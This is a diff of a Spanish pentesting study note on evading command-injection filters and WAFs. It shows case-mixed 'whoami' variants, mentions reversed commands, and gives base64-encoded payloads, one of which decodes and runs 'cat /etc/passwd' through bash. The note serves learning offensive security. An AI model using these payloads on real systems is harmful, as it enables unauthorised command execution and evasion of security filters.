@@ -22,7 +22,7 @@ linked:
 |:-----------------:|:----------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
 |  <br>**Windows**  |               <pre><code>WhOaMi</code></pre>               |                          <br>**Nativo.** Windows (CMD/PS) es _case-insensitive_. Mezclar mayúsculas evade filtros de texto exacto.<br><br>                          |
 | <br><br>**Linux** |  <pre><code>$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")</code></pre>  | <br>**Translate (`tr`).** Convierte el input mezclado a minúsculas antes de ejecutarlo.<br>⚠️ Requiere bypass de espacios (ej. `%09` en lugar de espacios).<br><br> |
-| <br><br>**Linux** | <pre><code>`$(a="WhOaMi";printf %s "${a,,}")`</code></pre> |                                  <br>**Bash Expansion.** `${var,,}\` convierte el contenido de la variable a _lowercase_.<br><br>                                   |
+|   <br>**Linux**   | <pre><code>`$(a="WhOaMi";printf %s "${a,,}")`</code></pre> |                                  <br>**Bash Expansion.** `${var,,}\` convierte el contenido de la variable a _lowercase_.<br><br>                                   |
 ^ci-avanzado-mayusculas
 
 ### 2. Reversed Commands (Comandos Invertidos)
@@ -39,10 +39,10 @@ Ejecuta comandos escribiéndolos al revés para que el WAF no reconozca la firma
 
 La técnica más robusta. Permite inyectar caracteres prohibidos (como `|`, `/`, `;`) dentro de una cadena codificada segura.
 
-|                             **Entorno**                              |                         **Preparación (En mi máquina)**                          | **Payload (En la víctima)**                                                                                                                |
-|:--------------------------------------------------------------------:|:--------------------------------------------------------------------------------:|:------------------------------------------------------------------------------------------------------------------------------------------ |
-|                          <br><br>**Linux**                           |           <pre><code>echo -n 'cat /etc/passwd' \| base64`</code></pre>           | <br><pre><code>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)                                                                  |
-| <br>**Windows**<br>(Windows usa UTF-16LE, si no conviertes, fallará) | <pre><code>echo -n 'whoami' \| iconv -f utf-8 -t utf-16le \| base64</code></pre> | <br><pre><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"<br></code></pre> |
+|                                   **Entorno**                                    |                           **Preparación (En mi máquina)**                            | **Payload (En la víctima)**                                                                                                                        |
+| :------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------- |
+|                              <br><br><br>**Linux**                               |       <br><pre><code>echo -n 'cat /etc/passwd' \| base64`</code></pre><br><br>       | <br><br><pre><code>bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)                                                                      |
+| <br><br>**Windows**<br>(Windows usa UTF-16LE, si no conviertes, fallará)<br><br> | <br><pre><code>echo -n 'whoami' \| iconv -f utf-8 -t utf-16le \| base64</code></pre> | <br><br><br><pre><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"<br></code></pre> |
 ^ci-avanzado-comandos-codificados
 
 ***
